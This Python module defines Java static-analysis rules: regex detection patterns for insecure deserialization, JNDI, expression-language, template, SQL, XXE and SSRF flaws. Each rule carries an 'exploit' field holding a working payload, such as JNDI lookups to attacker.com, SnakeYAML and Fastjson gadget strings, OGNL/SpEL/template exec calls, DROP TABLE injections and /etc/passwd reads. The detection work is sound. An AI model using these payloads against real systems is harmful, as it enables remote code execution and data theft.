"""
Java SAST Patterns - Complete Magic Methods and Exploitation Patterns
"""

# ============================================================================
# JAVA MAGIC METHODS & SPECIAL CLASSES
# ============================================================================
JAVA_MAGIC_METHODS = {
    'name': 'Java Serialization & Reflection Methods',
    'description': 'All Java methods that can be abused for exploitation',
    'methods': {
        # SERIALIZATION - CRITICAL FOR RCE
        'readObject': {
            'trigger': 'ObjectInputStream.readObject()',
            'exploit_scenarios': [
                'CRITICAL: Deserialization RCE',
                'Gadget chain execution',
                'Apache Commons Collections',
                'Spring Framework gadgets',
            ],
            'dangerous_with': ['ObjectInputStream', 'readUnshared'],
        },
        'writeObject': {
            'trigger': 'ObjectOutputStream.writeObject()',
            'exploit_scenarios': [
                'Serialization manipulation',
                'Data injection',
            ],
            'dangerous_with': [],
        },
        'readResolve': {
            'trigger': 'Called after readObject()',
            'exploit_scenarios': [
                'Singleton bypass',
                'Object replacement attacks',
            ],
            'dangerous_with': [],
        },
        'writeReplace': {
            'trigger': 'Called before writeObject()',
            'exploit_scenarios': [
                'Serialization substitution',
            ],
            'dangerous_with': [],
        },
        'readObjectNoData': {
            'trigger': 'Serialization gap',
            'exploit_scenarios': [
                'Inheritance attacks',
            ],
            'dangerous_with': [],
        },
        'readExternal': {
            'trigger': 'Externalizable interface',
            'exploit_scenarios': [
                'Similar to readObject',
            ],
            'dangerous_with': [],
        },
        'writeExternal': {
            'trigger': 'Externalizable interface',
            'exploit_scenarios': [
                'Similar to writeObject',
            ],
            'dangerous_with': [],
        },
        
        # OBJECT LIFECYCLE
        'finalize': {
            'trigger': 'Garbage collection (deprecated)',
            'exploit_scenarios': [
                'Resource manipulation',
                'Timing attacks',
                'Resurrection attacks',
            ],
            'dangerous_with': [],
        },
        'clone': {
            'trigger': 'Object.clone()',
            'exploit_scenarios': [
                'Shallow copy vulnerabilities',
                'State duplication attacks',
            ],
            'dangerous_with': [],
        },
        
        # REFLECTION
        'invoke': {
            'trigger': 'Method.invoke()',
            'exploit_scenarios': [
                'CRITICAL: Arbitrary method invocation',
                'Security manager bypass',
                'Private method access',
            ],
            'dangerous_with': ['Method', 'Constructor'],
        },
        'newInstance': {
            'trigger': 'Class.newInstance() / Constructor.newInstance()',
            'exploit_scenarios': [
                'Arbitrary class instantiation',
                'Factory bypass',
            ],
            'dangerous_with': ['Class.forName'],
        },
        'forName': {
            'trigger': 'Class.forName()',
            'exploit_scenarios': [
                'Dynamic class loading',
                'Classpath manipulation',
            ],
            'dangerous_with': ['newInstance', 'getMethod'],
        },
        'getMethod': {
            'trigger': 'Class.getMethod()',
            'exploit_scenarios': [
                'Method enumeration',
                'Reflection chain building',
            ],
            'dangerous_with': ['invoke'],
        },
        'getDeclaredMethod': {
            'trigger': 'Access private methods',
            'exploit_scenarios': [
                'Private method invocation',
            ],
            'dangerous_with': ['setAccessible', 'invoke'],
        },
        'setAccessible': {
            'trigger': 'Bypass access modifiers',
            'exploit_scenarios': [
                'CRITICAL: Access private members',
                'Security bypass',
            ],
            'dangerous_with': ['invoke', 'get', 'set'],
        },
        'getField': {
            'trigger': 'Field access',
            'exploit_scenarios': [
                'Field manipulation',
            ],
            'dangerous_with': ['get', 'set'],
        },
        'getDeclaredField': {
            'trigger': 'Private field access',
            'exploit_scenarios': [
                'Private field manipulation',
            ],
            'dangerous_with': ['setAccessible', 'get', 'set'],
        },
        
        # CLASSLOADER
        'defineClass': {
            'trigger': 'ClassLoader.defineClass()',
            'exploit_scenarios': [
                'CRITICAL: Load arbitrary bytecode',
                'RCE via class injection',
            ],
            'dangerous_with': ['newInstance'],
        },
        'loadClass': {
            'trigger': 'ClassLoader.loadClass()',
            'exploit_scenarios': [
                'Dynamic class loading',
                'Classpath manipulation',
            ],
            'dangerous_with': [],
        },
        'findClass': {
            'trigger': 'ClassLoader.findClass()',
            'exploit_scenarios': [
                'Class resolution manipulation',
            ],
            'dangerous_with': [],
        },
        
        # PROXY
        'invoke (InvocationHandler)': {
            'trigger': 'Proxy.newProxyInstance()',
            'exploit_scenarios': [
                'Dynamic proxy exploitation',
                'AOP manipulation',
            ],
            'dangerous_with': [],
        },
        
        # JNDI - CRITICAL
        'lookup': {
            'trigger': 'Context.lookup() / InitialContext.lookup()',
            'exploit_scenarios': [
                'CRITICAL: JNDI Injection',
                'Log4Shell style attacks',
                'RMI/LDAP code execution',
            ],
            'dangerous_with': ['ldap://', 'rmi://', 'iiop://', 'dns://'],
        },
        
        # EXPRESSION LANGUAGE
        'evaluate': {
            'trigger': 'EL evaluation',
            'exploit_scenarios': [
                'Expression Language Injection',
                'Spring EL RCE',
            ],
            'dangerous_with': ['SpEL', 'OGNL', 'MVEL'],
        },
        'getValue': {
            'trigger': 'EL getValue()',
            'exploit_scenarios': [
                'EL Injection',
            ],
            'dangerous_with': [],
        },
        'setValue': {
            'trigger': 'EL setValue()',
            'exploit_scenarios': [
                'EL Injection',
            ],
            'dangerous_with': [],
        },
        
        # SCRIPTING
        'eval': {
            'trigger': 'ScriptEngine.eval()',
            'exploit_scenarios': [
                'CRITICAL: Script execution',
                'Nashorn/Rhino RCE',
            ],
            'dangerous_with': ['ScriptEngineManager'],
        },
        
        # BEANUTILS
        'getProperty': {
            'trigger': 'BeanUtils.getProperty()',
            'exploit_scenarios': [
                'Property access chain',
            ],
            'dangerous_with': [],
        },
        'setProperty': {
            'trigger': 'BeanUtils.setProperty()',
            'exploit_scenarios': [
                'Mass assignment',
                'Property injection',
            ],
            'dangerous_with': [],
        },
        'populate': {
            'trigger': 'BeanUtils.populate()',
            'exploit_scenarios': [
                'Mass assignment vulnerability',
                'CVE-2014-0114 style attacks',
            ],
            'dangerous_with': [],
        },
    },
    
    # DESERIALIZATION GADGET CHAINS
    'gadget_chains': {
        'CommonsCollections': {
            'description': 'Apache Commons Collections gadgets',
            'variants': ['CC1', 'CC2', 'CC3', 'CC4', 'CC5', 'CC6', 'CC7'],
            'classes': ['InvokerTransformer', 'ChainedTransformer', 'ConstantTransformer'],
        },
        'CommonsBeanutils': {
            'description': 'Apache Commons Beanutils gadget',
            'classes': ['BeanComparator'],
        },
        'Spring': {
            'description': 'Spring Framework gadgets',
            'classes': ['MethodInvokeTypeProvider', 'ObjectFactoryDelegatingInvocationHandler'],
        },
        'Jdk7u21': {
            'description': 'JDK 7u21 native gadget',
            'classes': ['AnnotationInvocationHandler', 'LinkedHashSet'],
        },
        'URLDNS': {
            'description': 'DNS exfiltration gadget (no RCE)',
            'classes': ['HashMap', 'URL'],
        },
        'JRMPClient': {
            'description': 'JRMP connection gadget',
            'classes': ['Registry', 'RemoteObjectInvocationHandler'],
        },
        'Groovy': {
            'description': 'Groovy library gadget',
            'classes': ['MethodClosure', 'ConvertedClosure'],
        },
        'Hibernate': {
            'description': 'Hibernate ORM gadget',
            'classes': ['TypedValue'],
        },
        'Wicket': {
            'description': 'Apache Wicket gadget',
            'classes': ['PropertyResolver'],
        },
    },
    
    # JNDI INJECTION PAYLOADS
    'jndi_payloads': {
        'rmi': 'rmi://attacker.com/Exploit',
        'ldap': 'ldap://attacker.com/Exploit',
        'dns': 'dns://attacker.com',
        'iiop': 'iiop://attacker.com/Exploit',
    },
}

# ============================================================================
# JAVA VULNERABILITY PATTERNS
# ============================================================================
JAVA_PATTERNS = [
    # ----- DESERIALIZATION -----
    {
        'id': 'java_deser_objectInputStream',
        'name': 'Java Insecure Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'ObjectInputStream\s*\([^)]*\)\s*\.readObject\s*\(',
        'description': 'Insecure deserialization via ObjectInputStream',
        'exploit': 'ysoserial CommonsCollections payload',
        'cwe': 'CWE-502',
    },
    {
        'id': 'java_deser_xmlDecoder',
        'name': 'Java XMLDecoder Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'XMLDecoder\s*\([^)]*\)\s*\.readObject\s*\(',
        'description': 'RCE via XMLDecoder',
        'exploit': 'XMLDecoder payload with ProcessBuilder',
        'cwe': 'CWE-502',
    },
    {
        'id': 'java_deser_xstream',
        'name': 'Java XStream Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'XStream\s*\([^)]*\)\s*\.fromXML\s*\(',
        'description': 'RCE via XStream',
        'exploit': 'XStream gadget payload',
        'cwe': 'CWE-502',
    },
    {
        'id': 'java_deser_snakeyaml',
        'name': 'Java SnakeYAML Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'Yaml\s*\([^)]*\)\s*\.load\s*\(',
        'description': 'RCE via SnakeYAML',
        'exploit': '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]',
        'cwe': 'CWE-502',
    },
    {
        'id': 'java_deser_jackson',
        'name': 'Java Jackson Polymorphic Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'enableDefaultTyping\s*\(|@JsonTypeInfo\s*\(\s*use\s*=\s*JsonTypeInfo\.Id\.(CLASS|MINIMAL_CLASS)',
        'description': 'Jackson polymorphic deserialization',
        'exploit': '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://attacker/Exploit"}]',
        'cwe': 'CWE-502',
    },
    {
        'id': 'java_deser_fastjson',
        'name': 'Java Fastjson Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'JSON\.parse(Object)?\s*\([^)]*\)',
        'description': 'Fastjson deserialization',
        'exploit': '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker/Exploit"}',
        'cwe': 'CWE-502',
    },
    
    # ----- JNDI INJECTION -----
    {
        'id': 'java_jndi_injection',
        'name': 'Java JNDI Injection',
        'category': 'jndi_injection',
        'severity': 'critical',
        'pattern': r'(InitialContext|Context)\s*\([^)]*\)\s*\.lookup\s*\([^)]*(?:request|param|input|\+)',
        'description': 'JNDI injection (Log4Shell style)',
        'exploit': '${jndi:ldap://attacker.com/Exploit}',
        'cwe': 'CWE-502',
    },
    
    # ----- COMMAND INJECTION -----
    {
        'id': 'java_cmdi_runtime',
        'name': 'Java Runtime.exec() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'Runtime\.getRuntime\s*\(\s*\)\s*\.exec\s*\([^)]*(?:request|param|input|\+)',
        'description': 'Command injection via Runtime.exec()',
        'exploit': '; id',
        'cwe': 'CWE-78',
    },
    {
        'id': 'java_cmdi_processbuilder',
        'name': 'Java ProcessBuilder Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'ProcessBuilder\s*\([^)]*(?:request|param|input|\+)',
        'description': 'Command injection via ProcessBuilder',
        'exploit': 'Inject command in array',
        'cwe': 'CWE-78',
    },
    
    # ----- EXPRESSION LANGUAGE INJECTION -----
    {
        'id': 'java_el_spel',
        'name': 'Spring Expression Language Injection',
        'category': 'el_injection',
        'severity': 'critical',
        'pattern': r'(SpelExpressionParser|StandardEvaluationContext)\s*\([^)]*\)\s*\.(parseExpression|getValue)',
        'description': 'Spring EL injection',
        'exploit': 'T(java.lang.Runtime).getRuntime().exec("id")',
        'cwe': 'CWE-917',
    },
    {
        'id': 'java_el_ognl',
        'name': 'OGNL Injection',
        'category': 'el_injection',
        'severity': 'critical',
        'pattern': r'Ognl\.(getValue|setValue|parseExpression)\s*\([^)]*(?:request|param|input)',
        'description': 'OGNL injection (Struts style)',
        'exploit': '%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec("id"))}',
        'cwe': 'CWE-917',
    },
    {
        'id': 'java_el_mvel',
        'name': 'MVEL Injection',
        'category': 'el_injection',
        'severity': 'critical',
        'pattern': r'MVEL\.(eval|compileExpression)\s*\([^)]*(?:request|param|input)',
        'description': 'MVEL injection',
        'exploit': 'Runtime.getRuntime().exec("id")',
        'cwe': 'CWE-917',
    },
    {
        'id': 'java_el_juel',
        'name': 'JUEL/EL Injection',
        'category': 'el_injection',
        'severity': 'critical',
        'pattern': r'(ExpressionFactory|ValueExpression)\s*[^;]*(?:request|param|input)',
        'description': 'Unified EL injection',
        'exploit': '${applicationScope.toString()}',
        'cwe': 'CWE-917',
    },
    
    # ----- SQL INJECTION -----
    {
        'id': 'java_sqli_statement',
        'name': 'Java SQL Injection (Statement)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(Statement|createStatement)\s*[^;]*execute(Query|Update)?\s*\([^)]*(?:request|param|input|\+)',
        'description': 'SQL injection via Statement',
        'exploit': '\' OR 1=1--',
        'cwe': 'CWE-89',
    },
    {
        'id': 'java_sqli_concat',
        'name': 'Java SQL Injection (Concatenation)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'["\']SELECT[^"\']*["\'\s]*\+\s*(?:request|param|input|[a-zA-Z_]+)',
        'description': 'SQL injection via string concatenation',
        'exploit': '\'; DROP TABLE users;--',
        'cwe': 'CWE-89',
    },
    {
        'id': 'java_sqli_hibernate',
        'name': 'Java HQL Injection',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'createQuery\s*\([^)]*(?:request|param|input|\+)',
        'description': 'HQL injection',
        'exploit': '\' OR \'1\'=\'1',
        'cwe': 'CWE-89',
    },
    
    # ----- PATH TRAVERSAL -----
    {
        'id': 'java_path_traversal',
        'name': 'Java Path Traversal',
        'category': 'path_traversal',
        'severity': 'high',
        'pattern': r'new\s+File\s*\([^)]*(?:request|param|input|\+)',
        'description': 'Path traversal vulnerability',
        'exploit': '../../../etc/passwd',
        'cwe': 'CWE-22',
    },
    
    # ----- XXE -----
    {
        'id': 'java_xxe_dom',
        'name': 'Java XXE (DocumentBuilder)',
        'category': 'xxe',
        'severity': 'high',
        'pattern': r'DocumentBuilderFactory\s*\.[^;]*newDocumentBuilder\s*\(\s*\)\s*\.parse',
        'description': 'XXE via DocumentBuilder',
        'exploit': '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        'cwe': 'CWE-611',
    },
    {
        'id': 'java_xxe_sax',
        'name': 'Java XXE (SAXParser)',
        'category': 'xxe',
        'severity': 'high',
        'pattern': r'SAXParserFactory\s*\.[^;]*newSAXParser\s*\(\s*\)\s*\.parse',
        'description': 'XXE via SAXParser',
        'exploit': 'Same XXE payload',
        'cwe': 'CWE-611',
    },
    
    # ----- SSRF -----
    {
        'id': 'java_ssrf_url',
        'name': 'Java SSRF (URL)',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'new\s+URL\s*\([^)]*(?:request|param|input)\s*[^)]*\)\s*\.open(Connection|Stream)',
        'description': 'SSRF via URL',
        'exploit': 'http://169.254.169.254/latest/meta-data/',
        'cwe': 'CWE-918',
    },
    {
        'id': 'java_ssrf_httpclient',
        'name': 'Java SSRF (HttpClient)',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'HttpClient[^;]*(execute|send)\s*\([^)]*(?:request|param|input)',
        'description': 'SSRF via HttpClient',
        'exploit': 'http://localhost:8080/admin',
        'cwe': 'CWE-918',
    },
    
    # ----- TEMPLATE INJECTION -----
    {
        'id': 'java_ssti_freemarker',
        'name': 'Java SSTI (FreeMarker)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'Template\s*[^;]*process\s*\([^)]*(?:request|param|input)',
        'description': 'FreeMarker template injection',
        'exploit': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        'cwe': 'CWE-94',
    },
    {
        'id': 'java_ssti_velocity',
        'name': 'Java SSTI (Velocity)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'Velocity\.(evaluate|mergeTemplate)\s*\([^)]*(?:request|param|input)',
        'description': 'Velocity template injection',
        'exploit': '#set($e="")$e.class.forName("java.lang.Runtime").getRuntime().exec("id")',
        'cwe': 'CWE-94',
    },
    {
        'id': 'java_ssti_thymeleaf',
        'name': 'Java SSTI (Thymeleaf)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'TemplateEngine\s*[^;]*process\s*\([^)]*(?:request|param|input)',
        'description': 'Thymeleaf template injection',
        'exploit': '__${T(java.lang.Runtime).getRuntime().exec("id")}__::',
        'cwe': 'CWE-94',
    },
    
    # ----- REFLECTION ABUSE -----
    {
        'id': 'java_reflection_invoke',
        'name': 'Java Reflection Method Invoke',
        'category': 'reflection',
        'severity': 'high',
        'pattern': r'\.getMethod\s*\([^)]*\)\s*\.invoke\s*\([^)]*(?:request|param|input)',
        'description': 'Reflection invoke with user input',
        'exploit': 'Invoke arbitrary methods',
        'cwe': 'CWE-470',
    },
    
    # ----- LDAP INJECTION -----
    {
        'id': 'java_ldap_injection',
        'name': 'Java LDAP Injection',
        'category': 'ldap_injection',
        'severity': 'high',
        'pattern': r'(DirContext|LdapContext)\s*[^;]*search\s*\([^)]*(?:request|param|input|\+)',
        'description': 'LDAP injection vulnerability',
        'exploit': '*)(uid=*))(|(uid=*',
        'cwe': 'CWE-90',
    },
    
    # ----- HARDCODED SECRETS -----
    {
        'id': 'java_secrets',
        'name': 'Java Hardcoded Secrets',
        'category': 'secrets',
        'severity': 'high',
        'pattern': r'(PASSWORD|SECRET|API_KEY|PRIVATE_KEY)\s*=\s*"[^"]{8,}"',
        'description': 'Hardcoded secrets',
        'exploit': 'Credential theft',
        'cwe': 'CWE-798',
    },
    
    # ----- CRYPTO ISSUES -----
    {
        'id': 'java_weak_cipher',
        'name': 'Java Weak Cipher',
        'category': 'crypto',
        'severity': 'medium',
        'pattern': r'Cipher\.getInstance\s*\(\s*"(DES|RC4|RC2|Blowfish|MD5)"',
        'description': 'Weak cipher algorithm',
        'exploit': 'Cryptographic attack',
        'cwe': 'CWE-327',
    },
    {
        'id': 'java_weak_random',
        'name': 'Java Weak Random',
        'category': 'crypto',
        'severity': 'medium',
        'pattern': r'new\s+Random\s*\(',
        'description': 'Predictable random (use SecureRandom)',
        'exploit': 'Predict random values',
        'cwe': 'CWE-330',
    },
    
    # ----- INSECURE COOKIE -----
    {
        'id': 'java_insecure_cookie',
        'name': 'Java Insecure Cookie',
        'category': 'session',
        'severity': 'medium',
        'pattern': r'Cookie\s*[^;]*setSecure\s*\(\s*false\s*\)',
        'description': 'Cookie without Secure flag',
        'exploit': 'Cookie theft via HTTP',
        'cwe': 'CWE-614',
    },
    
    # ----- UNVALIDATED REDIRECT -----
    {
        'id': 'java_open_redirect',
        'name': 'Java Open Redirect',
        'category': 'open_redirect',
        'severity': 'medium',
        'pattern': r'(response\.sendRedirect|RequestDispatcher\.forward)\s*\([^)]*(?:request|param|input)',
        'description': 'Open redirect vulnerability',
        'exploit': 'https://evil.com',
        'cwe': 'CWE-601',
    },
    
    # ----- LOG INJECTION -----
    {
        'id': 'java_log_injection',
        'name': 'Java Log Injection',
        'category': 'log_injection',
        'severity': 'medium',
        'pattern': r'(logger|log)\.(info|debug|warn|error)\s*\([^)]*(?:request|param|input)',
        'description': 'Log injection (Log4Shell related)',
        'exploit': '${jndi:ldap://attacker.com/a}',
        'cwe': 'CWE-117',
    },
    
    # ----- SPRING SPECIFIC -----
    {
        'id': 'java_spring_actuator',
        'name': 'Spring Actuator Exposed',
        'category': 'info_disclosure',
        'severity': 'high',
        'pattern': r'management\.endpoints\.web\.exposure\.include\s*=\s*\*',
        'description': 'All Spring Actuator endpoints exposed',
        'exploit': '/actuator/env, /actuator/heapdump',
        'cwe': 'CWE-200',
    },
    
    # ----- STRUTS SPECIFIC -----
    {
        'id': 'java_struts_ognl',
        'name': 'Struts OGNL Injection',
        'category': 'el_injection',
        'severity': 'critical',
        'pattern': r'(ActionContext|ValueStack)\s*[^;]*(get|set)Value\s*\([^)]*(?:request|param)',
        'description': 'Struts OGNL injection',
        'exploit': '%{(#context["xwork.MethodAccessor.denyMethodExecution"]=false)}',
        'cwe': 'CWE-917',
    },
]
